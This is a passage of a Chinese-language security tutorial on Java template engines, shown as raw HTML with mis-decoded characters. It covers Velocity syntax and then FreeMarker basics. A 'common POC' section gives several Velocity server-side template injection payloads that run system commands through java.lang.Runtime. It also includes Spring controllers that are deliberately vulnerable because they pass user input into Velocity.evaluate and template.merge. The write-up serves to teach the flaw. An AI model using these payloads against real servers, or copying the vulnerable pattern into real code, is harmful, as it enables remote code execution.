</span><br><span class="line">$element</span><br><span class="line">## é›†åˆçš„åºå· ä»<span class="number">1</span>å¼€å§‹</span><br><span class="line">$&#123;velocityCount&#125;</span><br><span class="line">## é›†åˆçš„é•¿åº¦</span><br><span class="line">$&#123;list.size()&#125;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>mapé›†åˆå¾ªç¯è¯­æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç #foreach ($entry in $map.entrySet())</span><br><span class="line">## mapçš„key   mapçš„valueå€¼</span><br><span class="line">$entry.key =&gt; $entry.value</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h4 id="5-æ¡ä»¶"><a href="#5-æ¡ä»¶" class="headerlink" title="5 æ¡ä»¶"></a>5 æ¡ä»¶</h4><p>Velocityæ¨¡æ¿ä¸­æ¡ä»¶è¯­æ³•if-ifelse-elseç»“æ„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç #<span class="keyword">if</span> (condition1)</span><br><span class="line"><span class="comment">// æ‰§è¡Œä¸šåŠ¡</span></span><br><span class="line">#elseif (condition2)</span><br><span class="line"><span class="comment">// æ‰§è¡Œä¸šåŠ¡</span></span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="comment">// æ‰§è¡Œä¸šåŠ¡</span></span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨çš„æ¡ä»¶è¯­å¥æ˜¯if-elseç»“æ„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç #<span class="keyword">if</span> (condition1)</span><br><span class="line"><span class="comment">// æ‰§è¡Œä¸šåŠ¡</span></span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="comment">// æ‰§è¡Œä¸šåŠ¡</span></span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p><strong>#break</strong></p><p>è¡¨ç¤ºè·³å‡ºå¾ªç¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç #<span class="keyword">if</span> (condition1)</span><br><span class="line">## æ¡ä»¶ç¬¦åˆè·³è¿‡</span><br><span class="line">#<span class="keyword">if</span>($user == <span class="string">&quot;æç™½&quot;</span>)</span><br><span class="line">    #<span class="keyword">break</span>;</span><br><span class="line">    #end</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="comment">// æ‰§è¡Œä¸šåŠ¡</span></span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p><strong>#stop</strong></p><p>è¡¨ç¤ºç»ˆæ­¢æŒ‡ä»¤,ç»ˆæ­¢æ¨¡æ¿è§£æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç #<span class="keyword">if</span> (condition1)</span><br><span class="line">## æ¡ä»¶ç¬¦åˆç›´æ¥ç»ˆæ­¢</span><br><span class="line">#<span class="keyword">if</span>($user == <span class="string">&quot;æç™½&quot;</span>)</span><br><span class="line">    #stop</span><br><span class="line">    #end</span><br><span class="line">    #<span class="keyword">else</span></span><br><span class="line">    <span class="comment">// æ‰§è¡Œä¸šåŠ¡</span></span><br><span class="line">    #end</span><br></pre></td></tr></table></figure><h4 id="6-æ³¨é‡Š"><a href="#6-æ³¨é‡Š" class="headerlink" title="6 æ³¨é‡Š"></a>6 æ³¨é‡Š</h4><p>å•è¡Œæ³¨é‡Š ##</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç ## å®šä¹‰ä¸€ä¸ªuserå˜é‡ä¸ºæç™½</span><br><span class="line">#set&#123;$user = <span class="string">&quot;æç™½&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>å¤šè¡Œæ³¨é‡Š #* *#</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç #*  </span><br><span class="line">å®šä¹‰ä¸€ä¸ªuserå˜é‡</span><br><span class="line">å°†userå˜é‡èµ‹å€¼ä¸º æç™½</span><br><span class="line">*#</span><br><span class="line">#set&#123;$user = <span class="string">&quot;æç™½&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>æ–‡æ¡£æ³¨é‡Š #** *#</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç  #** </span><br><span class="line"><span class="meta">@version</span> <span class="number">1.1</span></span><br><span class="line"><span class="meta">@author</span>  æç™½</span><br><span class="line">*#</span><br><span class="line">#set&#123;$user = <span class="string">&quot;æç™½&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="7-å¼•å…¥èµ„æº"><a href="#7-å¼•å…¥èµ„æº" class="headerlink" title="7 å¼•å…¥èµ„æº"></a>7 å¼•å…¥èµ„æº</h4><p><strong>#include</strong></p><p>è¡¨ç¤ºå¼•å…¥å¤–éƒ¨èµ„æºï¼Œå¼•å…¥çš„èµ„æºä¸è¢«å¼•æ“æ‰€è§£æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç #include( <span class="string">&quot;one.gif&quot;</span>,<span class="string">&quot;two.txt&quot;</span>,<span class="string">&quot;three.htm&quot;</span> )</span><br></pre></td></tr></table></figure><p><strong>#parse</strong></p><p>ç”¨äºå¯¼å…¥è„šæœ¬, å¼•å…¥çš„èµ„æºä¼šè¢«å¼•æ“æ‰€è§£æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç ##  a.vmæ–‡ä»¶</span><br><span class="line">#set($user = <span class="string">&quot;æç™½&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## b.vmæ–‡ä»¶</span><br><span class="line">#parse(<span class="string">&quot;a.vm&quot;</span>)</span><br><span class="line">## å˜é‡   å€¼</span><br><span class="line">$user  æç™½</span><br></pre></td></tr></table></figure><h3 id="å¸¸è§POC"><a href="#å¸¸è§POC" class="headerlink" title="å¸¸è§POC"></a>å¸¸è§POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‘½ä»¤æ‰§è¡Œ1</span></span><br><span class="line">#set($e=<span class="string">&quot;e&quot;</span>)</span><br><span class="line">$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;open -a Calculator&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘½ä»¤æ‰§è¡Œ2 </span></span><br><span class="line">#set($x=<span class="string">&#x27;&#x27;</span>)##</span><br><span class="line">#set($rt = $x.class.forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>))##</span><br><span class="line">#set($chr = $x.class.forName(<span class="string">&#x27;java.lang.Character&#x27;</span>))##</span><br><span class="line">#set($str = $x.class.forName(<span class="string">&#x27;java.lang.String&#x27;</span>))##</span><br><span class="line">#set($ex=$rt.getRuntime().exec(<span class="string">&#x27;id&#x27;</span>))##</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())##</span><br><span class="line">#foreach( $i in [<span class="number">1.</span>.$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘½ä»¤æ‰§è¡Œ3</span></span><br><span class="line">#set ($e=<span class="string">&quot;exp&quot;</span>)</span><br><span class="line">#set ($a=$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec($cmd))</span><br><span class="line">#set ($input=$e.getClass().forName(<span class="string">&quot;java.lang.Process&quot;</span>).getMethod(<span class="string">&quot;getInputStream&quot;</span>).invoke($a))</span><br><span class="line">#set($sc = $e.getClass().forName(<span class="string">&quot;java.util.Scanner&quot;</span>))</span><br><span class="line">#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(<span class="string">&quot;java.io.InputStream&quot;</span>)))</span><br><span class="line">#set($scan=$constructor.newInstance($input).useDelimiter(<span class="string">&quot;\A&quot;</span>))</span><br><span class="line">#<span class="keyword">if</span>($scan.hasNext())</span><br><span class="line">$scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h4 id="evaluateä¾‹å­ï¼š"><a href="#evaluateä¾‹å­ï¼š" class="headerlink" title="evaluateä¾‹å­ï¼š"></a>evaluateä¾‹å­ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javasecssti;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.Velocity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VelocityController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/ssti/velocity&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">velocity1</span><span class="params">(<span class="meta">@RequestParam(defaultValue=&quot;nth347&quot;)</span> String username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">templateString</span> <span class="operator">=</span> <span class="string">&quot;Hello, &quot;</span> + username + <span class="string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Velocity.init();</span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">        ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Nguyen Nguyen Nguyen&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;012345678&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;nguyen@vietnam.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        <span class="comment">// å°†æ¨¡æ¿å­—ç¬¦ä¸²å’Œä¸Šä¸‹æ–‡å¯¹è±¡ä¼ é€’ç»™Velocityå¼•æ“è¿›è¡Œè§£æå’Œæ¸²æŸ“</span></span><br><span class="line">        Velocity.evaluate(ctx, out, <span class="string">&quot;test&quot;</span>, templateString);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> out.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e=<span class="string">&quot;e&quot;</span>)</span><br><span class="line">$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;cmd /C calc&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¼¹å‡ºè®¡ç®—æœº</p><h4 id="merage"><a href="#merage" class="headerlink" title="merage:"></a>merage:</h4><p>mergeæ–¹æ³•ä½¿ç”¨VelocityEngineçš„getTemplateæ–¹æ³•è·å–æŒ‡å®šçš„æ¨¡æ¿æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨mergeæ–¹æ³•å°†æ¨¡æ¿å’Œä¸Šä¸‹æ–‡æ•°æ®åˆå¹¶ä¸ºæœ€ç»ˆç»“æœã€‚</p><p>template ï¼šå¾…å¤„ç†çš„ Velocity æ¨¡æ¿ã€‚</p><p>context ï¼šä¸Šä¸‹æ–‡æ•°æ®ï¼Œå³ç”¨äºæ›¿æ¢æ¨¡æ¿ä¸­å ä½ç¬¦çš„æ•°æ®ã€‚</p><p>writer ï¼šè¾“å‡ºç»“æœçš„å†™å…¥å™¨ï¼Œç”¨äºå°†ç”Ÿæˆçš„ç»“æœå†™å…¥åˆ°æŒ‡å®šä½ç½®ã€‚</p><p>åˆ›å»ºå¯¹åº”çš„code</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/ssti/velocity2&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">velocity2</span><span class="params">(<span class="meta">@RequestParam(defaultValue = &quot;nth347&quot;)</span> String username)</span> <span class="keyword">throws</span> IOException, ParseException, org.apache.velocity.runtime.parser.ParseException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">templateString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(<span class="string">&quot;/path/to/template.vm&quot;</span>)));</span><br><span class="line">    templateString = templateString.replace(<span class="string">&quot;&lt;USERNAME&gt;&quot;</span>, username);</span><br><span class="line"></span><br><span class="line">    <span class="type">StringReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringReader</span>(templateString);</span><br><span class="line"></span><br><span class="line">    <span class="type">VelocityContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">    ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Nguyen Nguyen Nguyen&quot;</span>);</span><br><span class="line">    ctx.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;012345678&quot;</span>);</span><br><span class="line">    ctx.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;nguyen@vietnam.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">    org.apache.velocity.<span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.velocity.Template();</span><br><span class="line"></span><br><span class="line">    <span class="type">RuntimeServices</span> <span class="variable">runtimeServices</span> <span class="operator">=</span> RuntimeSingleton.getRuntimeServices();</span><br><span class="line">    <span class="type">SimpleNode</span> <span class="variable">node</span> <span class="operator">=</span> runtimeServices.parse(reader, String.valueOf(template));</span><br><span class="line"></span><br><span class="line">    template.setRuntimeServices(runtimeServices);</span><br><span class="line">    template.setData(node);</span><br><span class="line">    template.initDocument();</span><br><span class="line"></span><br><span class="line">    template.merge(ctx, out);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out.toString();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¨¡æ¿æ–‡ä»¶template.vmå†…å®¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is &lt;USERNAME&gt;.</span><br><span class="line">Project is $project</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">è¿™æ®µä»£ç çš„ä¸»è¦ä½œç”¨æ˜¯è¯»å–Velocityæ¨¡æ¿æ–‡ä»¶ï¼Œæ›¿æ¢æ¨¡æ¿ä¸­çš„å ä½ç¬¦ï¼Œç„¶åä½¿ç”¨ç»™å®šçš„ä¸Šä¸‹æ–‡å¯¹è±¡è¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼Œå¹¶å°†æ¸²æŸ“ç»“æœä½œä¸ºå­—ç¬¦ä¸²è¿”å›<br></font>è¿‡ç¨‹ï¼š</p><ul><li>ä½¿ç”¨templateString.replaceå¯¹æ¨¡æ¿æ–‡ä»¶é‡Œçš„å†…å®¹è¿›è¡Œæ›¿æ¢ï¼Œè¿™é‡Œçš„æ›¿æ¢å€¼å¯æ§</li><li>runtimeServices.parseå°†æ¨¡æ¿å†…å®¹è¿›è¡Œè§£æ</li><li>template.merge(ctx, out);å°†æ¨¡æ¿å†…å®¹è¿›è¡Œæ¸²æŸ“ï¼Œè¿™é‡Œä¼šè°ƒç”¨SimpleNode#renderï¼Œè¿‡ç¨‹å¤§è‡´å’Œä¸Šé¢ä¸€è‡´</li></ul><p>ä»æŒ‡å®šè·¯å¾„è¯»å–æ¨¡æ¿æ–‡ä»¶ï¼Œå¦‚æœæ¨¡æ¿æ–‡ä»¶ä¸­å¸¦æœ‰æ”»å‡»è½½è·è¯­å¥ï¼Œå³å¯é€šè¿‡ template.merge æ¸²æŸ“è§¦å‘æ¨¡ æ¿æ³¨å…¥æ¼æ´ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹vmæ¸²æŸ“æ–‡ä»¶ã€‚</p><p>å‡è®¾æˆ‘ä»¬åˆ°äº†åå°ï¼Œæœ‰æ¨¡æ¿ä¿®æ”¹çš„åŠŸèƒ½ï¼Œé‚£æˆ‘ä»¬ä¾¿å¯ä¿®æ”¹vmæ–‡ä»¶æ¥è¿›è¡Œæ”»å‡»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e=<span class="string">&quot;sss&quot;</span>);</span><br><span class="line">$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="FreeMarkerç®€ä»‹"><a href="#FreeMarkerç®€ä»‹" class="headerlink" title="FreeMarkerç®€ä»‹"></a>FreeMarkerç®€ä»‹</h2><p>FreeMarker æ˜¯ä¸€æ¬¾ _æ¨¡æ¿å¼•æ“_ï¼š å³ä¸€ç§åŸºäºæ¨¡æ¿å’Œè¦æ”¹å˜çš„æ•°æ®ï¼Œ å¹¶ç”¨æ¥ç”Ÿæˆè¾“å‡ºæ–‡æœ¬(HTMLç½‘é¡µï¼Œç”µå­é‚®ä»¶ï¼Œé…ç½®æ–‡ä»¶ï¼Œæºä»£ç ç­‰)çš„é€šç”¨å·¥å…·ã€‚ å®ƒä¸æ˜¯é¢å‘æœ€ç»ˆç”¨æˆ·çš„ï¼Œè€Œæ˜¯ä¸€ä¸ªJavaç±»åº“ï¼Œæ˜¯ä¸€æ¬¾ç¨‹åºå‘˜å¯ä»¥åµŒå…¥ä»–ä»¬æ‰€å¼€å‘äº§å“çš„ç»„ä»¶ã€‚</p><p>æ¨¡æ¿ç¼–å†™ä¸ºFreeMarker Template Language (FTL)ã€‚å®ƒæ˜¯ç®€å•çš„ï¼Œä¸“ç”¨çš„è¯­è¨€ï¼Œ <em>ä¸æ˜¯</em> åƒPHPé‚£æ ·æˆç†Ÿçš„ç¼–ç¨‹è¯­è¨€ã€‚ é‚£å°±æ„å‘³ç€è¦å‡†å¤‡æ•°æ®åœ¨çœŸå®ç¼–ç¨‹è¯­è¨€ä¸­æ¥æ˜¾ç¤ºï¼Œæ¯”å¦‚æ•°æ®åº“æŸ¥è¯¢å’Œä¸šåŠ¡è¿ç®—ï¼Œ ä¹‹åæ¨¡æ¿æ˜¾ç¤ºå·²ç»å‡†å¤‡å¥½çš„æ•°æ®ã€‚åœ¨æ¨¡æ¿ä¸­ï¼Œä½ å¯ä»¥ä¸“æ³¨äºå¦‚ä½•å±•ç°æ•°æ®ï¼Œ è€Œåœ¨æ¨¡æ¿ä¹‹å¤–å¯ä»¥ä¸“æ³¨äºè¦å±•ç¤ºä»€ä¹ˆæ•°æ®ã€‚</p><h3 id="FreeMarkerè¯­æ³•"><a href="#FreeMarkerè¯­æ³•" class="headerlink" title="FreeMarkerè¯­æ³•"></a>FreeMarkerè¯­æ³•</h3><p>è¯´ç™½äº†FreeMarkerå’ŒJSPçš„ELè¡¨è¾¾å¼å·®ä¸å¤š æˆ–è€… è·Ÿthymleafçš„è¯­æ³•æ˜¯å·®ä¸å¤šçš„ã€‚</p><p>éƒ½æ˜¯ä½¿ç”¨${} æˆ–è€…æ ‡ç­¾ã€‚</p><h3 id="FreeMarkerå¸¸ç”¨è¯­æ³•"><a href="#FreeMarkerå¸¸ç”¨è¯­æ³•" class="headerlink" title="FreeMarkerå¸¸ç”¨è¯­æ³•"></a>FreeMarkerå¸¸ç”¨è¯­æ³•</h3><h4 id="ifæŒ‡ä»¤"><a href="#ifæŒ‡ä»¤" class="headerlink" title="ifæŒ‡ä»¤"></a>ifæŒ‡ä»¤</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;#<span class="keyword">if</span> name==<span class="string">&#x27;æå››&#x27;</span>&gt;</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&lt;/#<span class="keyword">if</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="listæŒ‡ä»¤"><a href="#listæŒ‡ä»¤" class="headerlink" title="listæŒ‡ä»¤"></a>listæŒ‡ä»¤</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testList</span><span class="params">(Map&lt;String,Object&gt; map)</span>&#123;</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt;  users = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    users.add(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lisi&quot;</span>,<span class="number">15</span>));</span><br><span class="line">    users.add(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;test&quot;</span>,<span class="number">25</span>));</span><br><span class="line">    users.add(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">25</span>));</span><br><span class="line">    map.put(<span class="string">&quot;lists&quot;</span>,users);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test2&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;#list lists as u&gt;</span><br><span class="line">        &lt;#<span class="keyword">if</span> u_index%<span class="number">2</span>==<span class="number">0</span> &gt;&lt;tr style=<span class="string">&quot;background-color: red&quot;</span>&gt;&lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">if</span> u_index%<span class="number">2</span>!=<span class="number">0</span>&gt;&lt;tr style=<span class="string">&quot;background-color: green&quot;</span>&gt;&lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;$&#123;u.name&#125;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;u.age&#125;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">    &lt;/#list&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><h4 id="éå†Map"><a href="#éå†Map" class="headerlink" title="éå†Map"></a>éå†Map</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test3&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMap</span><span class="params">(Map&lt;String,Object&gt; map)</span>&#123;</span><br><span class="line">    HashMap&lt;String, Object&gt;  mp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    mp.put(<span class="string">&quot;1&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lisi&quot;</span>,<span class="number">15</span>));</span><br><span class="line">    mp.put(<span class="string">&quot;2&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">19</span>));</span><br><span class="line">    mp.put(<span class="string">&quot;3&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;test&quot;</span>,<span class="number">20</span>));</span><br><span class="line">    map.put(<span class="string">&quot;ma&quot;</span>,mp);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test3&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 